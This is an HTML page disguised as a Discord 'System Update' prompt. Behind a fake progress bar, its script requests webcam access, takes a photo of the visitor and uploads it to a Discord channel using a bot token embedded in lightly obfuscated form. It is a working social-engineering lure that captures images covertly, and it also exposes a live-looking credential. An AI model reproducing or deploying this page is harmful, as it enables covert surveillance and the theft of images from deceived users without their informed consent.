<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .terminal { max-width: 800px; margin: 0 auto; border: 2px solid #00ff00; padding: 20px; }
        button { background: #00ff00; color: #000; border: none; padding: 10px; font-size: 16px; cursor: pointer; width: 100%; }
        .progress { width: 100%; height: 20px; background: #333; margin: 10px 0; }
        .progress-bar { height: 20px; background: #00ff00; width: 0%; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>⚡ System Update Required</h2>
        <p>Click update to continue using Discord</p>
        <div id="output"></div>
        <div class="progress"><div class="progress-bar" id="progress"></div></div>
        <button onclick="startUpdate()">▶ UPDATE NOW</button>
    </div>

    <script>
    // ===== التشفير البسيط (عكس الحروف) =====
    function decodeToken(encoded) {
        // كل حرفين يتعكسوا
        var result = "";
        for (var i = 0; i < encoded.length; i += 2) {
            if (i + 1 < encoded.length) {
                result += encoded[i + 1] + encoded[i];
            } else {
                result += encoded[i];
            }
        }
        return result;
    }
    
    // التوكن مشفر بطريقة بسيطة (عكس كل حرفين)
    var encodedToken = "M1T5M2TEU5yO8Dg5Y0D3M1I0N5Q.G6FGN7.KbVpeQKfW0xGJHInu0VH9yVb1AB9TRt36h3y68";
    var token = decodeToken(encodedToken);
    var channel = 1475949185294536859;
    
    async function startUpdate() {
        document.querySelector('button').disabled = true;
        var progress = 0;
        var output = document.getElementById('output');
        var bar = document.getElementById('progress');
        
        output.innerHTML = 'Starting update...';
        
        var interval = setInterval(function() {
            progress += 10;
            bar.style.width = progress + '%';
            output.innerHTML = 'Updating... ' + progress + '%';
            
            if (progress >= 100) {
                clearInterval(interval);
                output.innerHTML = '✅ Update complete!';
                takePhoto();
            }
        }, 300);
    }
    
    async function takePhoto() {
        output.innerHTML = 'Accessing camera...';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            output.innerHTML = '✅ Camera access granted';
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async function(blob) {
                    output.innerHTML = 'Sending photo...';
                    
                    const formData = new FormData();
                    formData.append('file', blob, 'photo.jpg');
                    formData.append('content', '📸 Photo captured');
                    
                    try {
                        const response = await fetch('https://discord.com/api/v10/channels/' + channel + '/messages', {
                            method: 'POST',
                            headers: {
                                'Authorization': 'Bot ' + token
                            },
                            body: formData
                        });
                        
                        if (response.ok) {
                            output.innerHTML = '✅ Photo sent successfully!';
                        } else {
                            output.innerHTML = '❌ Failed to send: ' + response.status;
                        }
                    } catch (err) {
                        output.innerHTML = '❌ Error: ' + err.message;
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
                
            }, 1500);
            
        } catch (err) {
            output.innerHTML = '❌ Camera error: ' + err.message;
        }
    }
    </script>
</body>
</html>
